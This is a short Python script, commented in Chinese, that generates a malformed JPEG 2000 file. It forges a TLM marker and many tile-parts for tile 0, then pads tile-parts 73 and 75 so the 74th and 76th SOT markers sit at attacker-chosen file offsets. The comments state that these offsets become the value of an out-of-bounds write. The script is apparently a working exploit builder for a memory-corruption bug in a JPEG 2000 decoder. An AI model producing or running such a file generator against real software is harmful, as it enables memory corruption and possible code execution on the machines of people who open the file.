import struct
import sys

# mk_pp.py <template> <out> <N> <OFF74> <OFF76>
# N 个 tile0 的 tile-part（TPsot 连续 0..N-1），另加 tile1..3 各 1 个 part。
# 用第 73 / 75 个 part 的 payload 长度，把第 74 / 76 个 SOT 顶到指定文件偏移。
# 越界写值 = 该 part 的 SOT 在文件里的偏移。

TPL, OUT = sys.argv[1], sys.argv[2]
N = int(sys.argv[3])
OFF74 = int(sys.argv[4], 0)
OFF76 = int(sys.argv[5], 0)

d = open(TPL, 'rb').read()
soc = d.find(b'\xff\x4f')
si = d.find(b'\xff\x51', soc)
siz_end = si + 2 + struct.unpack('>H', d[si + 2:si + 4])[0]
orig_tlm = d.find(b'\xff\x55', soc)
orig_tlm_end = orig_tlm + 2 + struct.unpack('>H', d[orig_tlm + 2:orig_tlm + 4])[0]
first_sot = d.find(b'\xff\x90', soc)

ntiles = 4
ents = b''.join(bytes([t]) + struct.pack('>H', 1) for t in range(ntiles))
TLM = b'\xff\x55' + struct.pack('>H', 4 + len(ents)) + bytes([0, 0x10]) + ents
mid = d[orig_tlm_end:first_sot]
head = siz_end + len(TLM) + len(mid)

PAY = b'\x00' * 64
buf = bytearray(d[:siz_end]) + bytearray(TLM) + bytearray(mid)
assert len(buf) == head


def emit(tp, pay, tile=0):
    psot = 12 + 2 + len(pay)
    buf.extend(b'\xff\x90' + struct.pack('>H', 10) + struct.pack('>H', tile) +
               struct.pack('>I', psot) + bytes([tp, 0]))
    buf.extend(b'\xff\x93')
    buf.extend(pay)


for k in range(N):
    if k == 74:
        assert len(buf) == OFF74, 'k74 at %#x want %#x' % (len(buf), OFF74)
    if k == 76:
        assert len(buf) == OFF76, 'k76 at %#x want %#x' % (len(buf), OFF76)
    if k == 73:
        pad = OFF74 - len(buf) - 14
        if pad < 0:
            sys.exit('OFF74 too small, pad=%d' % pad)
        emit(k, b'\x00' * pad)
    elif k == 75:
        pad = OFF76 - len(buf) - 14
        if pad < 0:
            sys.exit('OFF76 too small, pad=%d' % pad)
        emit(k, b'\x00' * pad)
    else:
        emit(k, PAY)

for t in (1, 2, 3):
    emit(0, PAY, tile=t)

buf.extend(b'\xff\xd9')
open(OUT, 'wb').write(bytes(buf))
print('OK len=%d(%#x) head=%#x N=%d' % (len(buf), len(buf), head, N))
print('SOT74=%#x SOT76=%#x' % (OFF74, OFF76))